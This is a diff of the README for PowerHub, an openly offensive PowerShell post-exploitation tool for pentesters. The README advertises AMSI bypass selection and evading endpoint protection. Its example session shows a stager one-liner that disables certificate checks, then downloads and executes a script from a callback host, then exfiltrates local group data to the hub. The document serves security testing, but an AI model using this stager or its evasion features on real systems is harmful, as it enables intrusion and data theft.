@@ -3,8 +3,7 @@ PowerHub
 
 PowerHub is a convenient post exploitation tool for PowerShell which aids a
 pentester in transferring data, in particular code which may get flagged by
-endpoint protection. Check out the
-[Wiki](https://github.com/AdrianVollmer/PowerHub/wiki/)! Features:
+endpoint protection. Features:
 
 * Fileless
 * Stateless
@@ -12,7 +11,6 @@ endpoint protection. Check out the
 * String "obfuscation" by RC4 encryption
 * Choose your AMSI Bypass
 * Transparent aliases for in-memory execution of C# programs
-
 
 ![PowerHub Webapp](docs/img/powerhub-webapp.png)
 ![PowerHub Webapp](docs/img/powerhub-sharphound.png)
@@ -35,15 +33,13 @@ Here is a simple example (grab information about local groups with PowerView
 and transfer it back):
 
 ```powershell
-PS C:\Users\avollmer> $K=New-Object Net.WebClient;'a=reflection','t=http'|%{IEX $K.DownloadString('http://192.168.11.2:8080/0?'+$_)}
-True
+PS C:\Users\avollmer> [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$Nxois='bZeVBC4vZfakT5SmCcaFam6IRY6UNLnC';$Plukgmio=New-Object Net.WebClient;IEX $Plukgmio.DownloadString('https://192.168.11.2:8443/')
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
  |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
  |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
-1.11                        written by Adrian Vollmer, 2018-2022
+2.0.0                       written by Adrian Vollmer, 2018-202
 Run 'Help-PowerHub' for help
 PS C:\Users\avollmer> Get-HubModule PowerView
-
 
 Name   : /home/avollmer/.local/share/powerhub/modules/PowerSploit/Recon/PowerView.ps1
 Type   : ps1
@@ -54,52 +50,31 @@ Alias  :
 PS C:\Users\avollmer> Get-LocalGroup | PushTo-Hub -Name groups.json
 ```
 
+Documentation
+=============
 
-Installation
-============
+Read the docs [here](https://adrianvollmer.github.io/PowerHub/).
 
-PowerHub can be installed like any other Python package. Just execute
-`python3 -m pip install powerhub`. If you like to work with virtual
-environments, I recommend [pipx](https://github.com/pypa/pipx/).
-
-If you want to use the latest version, install with `python3 -m pip install
-git+https://github.com/AdrianVollmer/PowerHub`.
-
-Developers should clone the repository and do an editable install with
-`python3 -m pip install -e .`.
-
-For building the payloads, you need the MinGW GCC and Mono C# compilers. On
-Debian-like systems, you can install them with `apt-get install mono-mcs
-gcc-mingw-w64-x86-64 gcc-mingw-w64-i686`.
-
-
-Usage
-=====
-
-PowerHub has one mandatory argument: the callback host (can be an IP
-address). You should also use `--auth <user>:<pass>`, otherwise, a randomly
-generated password will be used for basic authentication. The switch
-`--no-auth` disables basic authentication which is *not recommended*. The
-callback host name is used by the stager to download the payload. If the
-callback port or path differ from the default, it can also be changed.
-
-Read `powerhub --help` and the [Wiki](https://github.com/AdrianVollmer/PowerHub/wiki/Usage) for details.
+**Installation:** <https://adrianvollmer.github.io/PowerHub/installation.html>
+**Usage:** <https://adrianvollmer.github.io/PowerHub/usage.html>
+**Contributing:** <https://adrianvollmer.github.io/PowerHub/contrib.html>
+**Changelog:** <https://adrianvollmer.github.io/PowerHub/changelog.html>
 
 
 Credits
 =======
 
 PowerHub is partially based on the awesome work of zc00l, @am0nsec, mar10,
-p3nt4, @SkelSec. And of course, it would be nothing without @harmj0y,
+p3nt4. And of course, it would be nothing without @harmj0y,
 @mattifestation and the many other contributors to
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit).
 
 Thanks!
 
-Author
-======
+Author and License
+==================
 
-Adrian Vollmer, 2018-2023
+Adrian Vollmer, 2018-2023. MIT License.
 
 Disclaimer
 ==========
